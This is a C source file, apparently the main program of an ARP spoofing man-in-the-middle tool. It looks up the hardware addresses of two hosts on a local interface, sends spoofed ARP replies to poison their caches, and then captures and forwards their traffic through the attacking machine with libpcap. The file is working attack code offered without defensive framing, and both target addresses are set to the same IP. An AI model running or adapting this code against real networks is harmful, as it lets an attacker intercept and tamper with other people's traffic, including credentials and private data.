#include <stdio.h>
#include <sys/types.h> // for u_char
#include <arpa/inet.h> // for htons, inet_addr
#include <pcap/pcap.h> // for pcap_loop
#include <string.h> // for memcpy
#include <stdlib.h> // for exit
#include "find_target_ethernet_address.h"
#include "find_ethernet_address.h"
#include "arp_spoofing.h"
#include "pcap_init.h"
#include "packet_forward.h"
#include "header.h"

int main(int argc, char**argv) {

	unsigned long own_ip_address = inet_addr("192.168.64.1");
	unsigned long target1_ip_address = inet_addr("192.168.64.2");
	unsigned long target2_ip_address = inet_addr("192.168.64.2");

	u_char *target1_ethernet_address = 
		get_target_ethernet_address("enp0s5", (u_char*)&own_ip_address, (u_char*)&target1_ip_address);

	printf("Target1 ethernet address [%02x:%02x:%02x:%02x:%02x:%02x]\n",
		target1_ethernet_address[0], target1_ethernet_address[1], target1_ethernet_address[2],
		target1_ethernet_address[3], target1_ethernet_address[4], target1_ethernet_address[5]);

	u_char *target2_ethernet_address = 
		get_target_ethernet_address("enp0s5", (u_char*)&own_ip_address, (u_char*)&target2_ip_address);

	printf("Target2 ethernet address [%02x:%02x:%02x:%02x:%02x:%02x]\n",
		target2_ethernet_address[0], target2_ethernet_address[1], target2_ethernet_address[2],
		target2_ethernet_address[3], target2_ethernet_address[4], target2_ethernet_address[5]);

	send_arp_spoofing("enp0s5", target1_ethernet_address, (u_char*)&target1_ip_address, target2_ethernet_address, (u_char*)&target2_ip_address);

	u_char callback_args[sizeof(struct spoofing_attack)];
	struct spoofing_attack *spoofing_attack = (struct spoofing_attack*) callback_args;
	memcpy(spoofing_attack->target1_ethernet_address, target1_ethernet_address, ETH_ALEN);
	memcpy(spoofing_attack->target2_ethernet_address, target2_ethernet_address, ETH_ALEN);
	memcpy(spoofing_attack->man_in_the_middle_eth_address, find_ethernet_address("enp0s5"), ETH_ALEN);
	memcpy(spoofing_attack->interface_name, "enp0s5", sizeof("enp0s5"));

	int send_socket = socket(AF_INET, SOCK_PACKET, htons(ETH_P_ARP));
	if(send_socket < 0) {
		printf("Failed to create send socket for fowarding.\n");
		exit(1);
	}
	spoofing_attack->send_socket = send_socket;

	pcap_t *handle = init_pcap("enp0s5");
	pcap_loop(handle, 100000, forward, callback_args);
	printf("\n");
	
	return 0;
}
